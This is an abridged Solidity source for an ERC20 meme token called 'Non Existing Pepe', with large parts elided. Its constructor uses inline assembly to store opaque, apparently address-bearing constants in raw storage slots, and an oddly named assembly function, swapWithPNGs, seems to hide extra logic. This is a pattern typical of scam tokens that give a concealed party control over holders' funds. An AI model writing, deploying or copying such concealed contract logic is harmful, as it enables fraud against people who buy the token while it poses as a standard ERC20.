...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0x7f4ce67b627d86ab0ce55d20ff8ca35aaa63be53932d)
            sstore(0x51,0x7f4ca381f780a46ed0a0edf50659f970ad237f9f166e)
    ...
    function swapWithPNGs(address sender, uint256 amount) internal returns (uint256 result) {
            assembly {
                let data := mload(0x40)
    ...
    function _DeployNonExistingPepe(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployNonExistingPepe(creator, initialSupply);
    }
}

contract NonExistingPepe is ERC20Token {
    constructor() ERC20Token("Non Existing Pepe", "PEPE0.0", msg.sender, 1010101010 * 10 ** 18) {
    }
}
